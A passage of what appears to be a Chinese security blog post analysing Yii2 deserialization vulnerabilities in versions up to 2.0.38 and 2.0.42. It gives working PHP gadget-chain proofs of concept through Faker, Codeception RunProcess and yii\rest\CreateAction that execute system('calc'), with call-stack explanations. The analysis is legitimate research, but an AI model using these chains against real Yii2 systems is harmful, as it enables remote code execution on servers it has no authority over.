+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+
+<span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">public</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>
+
+    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">public</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"close"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"run"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+
+<span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">CreateAction</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span><span class="token operator">=</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token operator">=</span><span class="token string double-quoted-string">"calc"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+
+<span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">;</span>
+    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BatchQueryResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="漏洞分析-lt-x3D-2-0-38"><a href="#漏洞分析-lt-x3D-2-0-38" class="headerlink" title="漏洞分析 &lt;&#x3D;2.0.38"></a>漏洞分析 &lt;&#x3D;2.0.38</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">&lt;</span>?php
+namespace yii\rest&#123;
+    class CreateAction&#123;
+        <span class="token keyword">public</span> $checkAccess<span class="token punctuation">;</span>
+        <span class="token keyword">public</span> $id<span class="token punctuation">;</span>
+
+        <span class="token keyword">public</span> <span class="token keyword">function</span> __construct<span class="token punctuation">(</span><span class="token punctuation">)</span>&#123;
+            $this<span class="token operator">-</span><span class="token operator">></span>checkAccess <span class="token operator">=</span> <span class="token string">'system'</span><span class="token punctuation">;</span>
+            $this<span class="token operator">-</span><span class="token operator">></span>id <span class="token operator">=</span> <span class="token string">'calc'</span><span class="token punctuation">;</span>
+        &#125;
+    &#125;
+&#125;
+
+namespace Faker&#123;
+    <span class="token keyword">use</span> yii\rest\CreateAction<span class="token punctuation">;</span>
+
+    class Generator&#123;
+        protected $formatters<span class="token punctuation">;</span>
+
+        <span class="token keyword">public</span> <span class="token keyword">function</span> __construct<span class="token punctuation">(</span><span class="token punctuation">)</span>&#123;
+            <span class="token comment">// 这里需要改为isRunning</span>
+            $this<span class="token operator">-</span><span class="token operator">></span>formatters<span class="token punctuation">[</span><span class="token string">'isRunning'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>new CreateAction<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        &#125;
+    &#125;
+&#125;
+
+<span class="token comment">// poc2</span>
+namespace Codeception\Extension&#123;
+    <span class="token keyword">use</span> Faker\Generator<span class="token punctuation">;</span>
+    class RunProcess&#123;
+        private $processes<span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> __construct<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        &#123;
+            $this<span class="token operator">-</span><span class="token operator">></span>processes <span class="token operator">=</span> <span class="token punctuation">[</span>new Generator<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        &#125;
+    &#125;
+&#125;
+namespace&#123;
+    <span class="token comment">// 生成poc</span>
+    echo base64_encode<span class="token punctuation">(</span>serialize<span class="token punctuation">(</span>new Codeception\Extension\RunProcess<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+&#125;
+?<span class="token operator">></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>反序列化调用栈<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1698563769340-a4a75f97-af39-42c3-8810-258258f1821d.png#averageHue=%239bb59a&clientId=u4f4d5088-20bb-4&from=paste&height=77&id=u563685f3&originHeight=115&originWidth=510&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=12424&status=done&style=none&taskId=ucf32916f-f1d9-438a-b811-032bb697933&title=&width=340" alt="image.png"></p>
+<p>调用Codeception\Extension\RunProcess的__destruct<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1698563778842-f5fee1d9-0661-4924-90ad-15907adf5a53.png#averageHue=%2324282b&clientId=u4f4d5088-20bb-4&from=paste&height=115&id=u4917b0ba&originHeight=173&originWidth=863&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=18066&status=done&style=none&taskId=u5b65de6a-7518-43f7-911a-de4fa779966&title=&width=575.3333333333334" alt="image.png"><br>进入stopprocess函数，从$this-&gt;processes中取出一个属性，并调用其isRunning方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1698563867503-92274747-44fd-4e25-929d-5df61e393705.png#averageHue=%23282c2f&clientId=u4f4d5088-20bb-4&from=paste&height=205&id=u5d65e248&originHeight=308&originWidth=1040&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=50716&status=done&style=none&taskId=u3c22b155-1b1e-44c9-9128-e9ef15e9393&title=&width=693.3333333333334" alt="image.png"><br>这里就可以去触发Faker\Generator的__call方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1698563959306-f8096ecf-17d6-4d77-be0b-a1b8d1e7881a.png#averageHue=%23262f38&clientId=u4f4d5088-20bb-4&from=paste&height=89&id=u7ac09308&originHeight=133&originWidth=875&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=21405&status=done&style=none&taskId=u9767b19a-6ca6-483e-af3d-75153051213&title=&width=583.3333333333334" alt="image.png"><br>后续也是一样的，从$this-&gt;formatters中取出call_user_func_array所要调用的run方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1698563971876-4cdbb2c6-2019-42f9-ad55-1484eff5e4bf.png#averageHue=%23252f38&clientId=u4f4d5088-20bb-4&from=paste&height=87&id=u988fb62f&originHeight=130&originWidth=994&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=21562&status=done&style=none&taskId=u54375e6a-614c-4b09-a43d-e3e13f95e10&title=&width=662.6666666666666" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1698564010195-b3cb2355-fbd7-4f00-b377-1b65c32bc45e.png#averageHue=%232c333b&clientId=u4f4d5088-20bb-4&from=paste&height=157&id=u05577953&originHeight=235&originWidth=887&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=49279&status=done&style=none&taskId=u1bb1f822-86a7-4b75-b9d0-f37413b1313&title=&width=591.3333333333334" alt="image.png"><br>最终调用<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1698564038408-72965329-da4a-4ca5-87e0-8862a182ba0f.png#averageHue=%23252e36&clientId=u4f4d5088-20bb-4&from=paste&height=103&id=ufd2a5914&originHeight=155&originWidth=858&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=20135&status=done&style=none&taskId=u9815bd0f-e0e4-4696-9a5a-cdadbe6f83f&title=&width=572" alt="image.png"></p>
+<h3 id="漏洞分析-lt-x3D-2-0-42"><a href="#漏洞分析-lt-x3D-2-0-42" class="headerlink" title="漏洞分析 &lt;&#x3D;2.0.42"></a>漏洞分析 &lt;&#x3D;2.0.42</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">&lt;</span>?php
+
+namespace Faker<span class="token punctuation">;</span>
+class DefaultGenerator&#123;
+    protected $<span class="token keyword">default</span> <span class="token punctuation">;</span>
+    <span class="token keyword">function</span> __construct<span class="token punctuation">(</span>$argv<span class="token punctuation">)</span>
+    &#123;
+        $this<span class="token operator">-</span><span class="token operator">></span><span class="token keyword">default</span> <span class="token operator">=</span> $argv<span class="token punctuation">;</span>
+    &#125;
+&#125;
+
+class ValidGenerator&#123;
+    protected $generator<span class="token punctuation">;</span>
+    protected $validator<span class="token punctuation">;</span>
+    protected $maxRetries<span class="token punctuation">;</span>
+    <span class="token keyword">function</span> __construct<span class="token punctuation">(</span>$command<span class="token punctuation">,</span>$argv<span class="token punctuation">)</span>
+    &#123;
+        $this<span class="token operator">-</span><span class="token operator">></span>generator <span class="token operator">=</span> new DefaultGenerator<span class="token punctuation">(</span>$argv<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        $this<span class="token operator">-</span><span class="token operator">></span>validator <span class="token operator">=</span> $command<span class="token punctuation">;</span>
+        $this<span class="token operator">-</span><span class="token operator">></span>maxRetries <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    &#125;
+&#125;
+
+namespace Codeception\Extension<span class="token punctuation">;</span>
+<span class="token keyword">use</span> Faker\ValidGenerator<span class="token punctuation">;</span>
+class RunProcess&#123;
+    private $processes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> __construct<span class="token punctuation">(</span>$command<span class="token punctuation">,</span>$argv<span class="token punctuation">)</span>
+    &#123;
+        $this<span class="token operator">-</span><span class="token operator">></span>processes<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> new ValidGenerator<span class="token punctuation">(</span>$command<span class="token punctuation">,</span>$argv<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    &#125;
+&#125;
+
+$exp <span class="token operator">=</span> new RunProcess<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span><span class="token string">'calc'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+echo<span class="token punctuation">(</span>base64_encode<span class="token punctuation">(</span>serialize<span class="token punctuation">(</span>$exp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>入口仍然是Codeception\Extension\RunProcess的__destruct<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1698564495602-0ba2b99a-469b-4c72-825a-f09977936811.png#averageHue=%2324282b&clientId=u4f4d5088-20bb-4&from=paste&height=286&id=u6f9d2c26&originHeight=429&originWidth=1229&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=58761&status=done&style=none&taskId=u2f4a5027-19a7-4cae-8a23-bd88a525026&title=&width=819.3333333333334" alt="image.png"><br>调用了Faker\VaildGenerator的__call方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1698564519997-abde7928-dc54-486a-affe-d9b1d7df1c50.png#averageHue=%2324292c&clientId=u4f4d5088-20bb-4&from=paste&height=243&id=ue197bee1&originHeight=364&originWidth=1216&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=52186&status=done&style=none&taskId=u696fe427-3e9a-4d26-8d6d-3498cfe7b56&title=&width=810.6666666666666" alt="image.png"><br>该call方法中会使用call_user_func_array去调用$this-&gt;generator类的$name方法，并将返回值设置为$res<br>这里调用Faker\DefaultGenerator的__call方法，会返回当前类中的$this-&gt;default属性为$res赋值，<br>最终结束while时调用call_user_func，$this-&gt;validator与$res均可控，从而执行命令<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1698564701948-70582bd6-797b-4ce5-b1be-ed90ddfdfad2.png#averageHue=%23232525&clientId=u4f4d5088-20bb-4&from=paste&height=56&id=u301208fd&originHeight=84&originWidth=488&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=9038&status=done&style=none&taskId=u0e3dc68c-039f-44fc-88b2-b8b0b64ae42&title=&width=325.3333333333333" alt="image.png"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/11/06/Cacti%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2022-46169/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2023-11-06 15:52:17
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#YII%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">YII基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6"><span class="toc-text">运行机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E7%BB%84%E4%BB%B6"><span class="toc-text">应用组件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E5%BC%95%E5%AF%BC%E4%B8%8E%E5%88%9B%E5%BB%BAURL"><span class="toc-text">路由引导与创建URL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82"><span class="toc-text">请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%93%8D%E5%BA%94"><span class="toc-text">响应</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-lt-x3D-2-0-37"><span class="toc-text">漏洞分析 &lt;&#x3D;2.0.37</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-lt-x3D-2-0-38"><span class="toc-text">漏洞分析 &lt;&#x3D;2.0.38</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-lt-x3D-2-0-42"><span class="toc-text">漏洞分析 &lt;&#x3D;2.0.42</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  
+    <script async type="text/javascript" src='https://cdn.jsdelivr.net/npm/valine@1.4.18/dist/Valine.min.js' onload="loadValineSuc(this)"></script>
+  
+
+  <div id="vcomments"></div>
+
+  <script>
+    function loadValineSuc() {
+      new Valine({
+        el: '#vcomments',
+        appId: 'bNa2jesvrDl0f51DIPiFWHCO-gzGzoHsz',
+        appKey: 'UfLQ40Ou8xWfDtBEct4Yxct1',
+        placeholder: 'welcome!',
+        avatar: 'retro',
+        lang: 'en'
+      })
+    }
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + YII2%E5%90%84%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90 + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F11%2F06%2FYII2%25E5%2590%2584%25E7%2589%2588%25E6%259C%25AC%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E5%2588%2586%25E6%259E%2590%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/11/06/YII2%E5%90%84%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
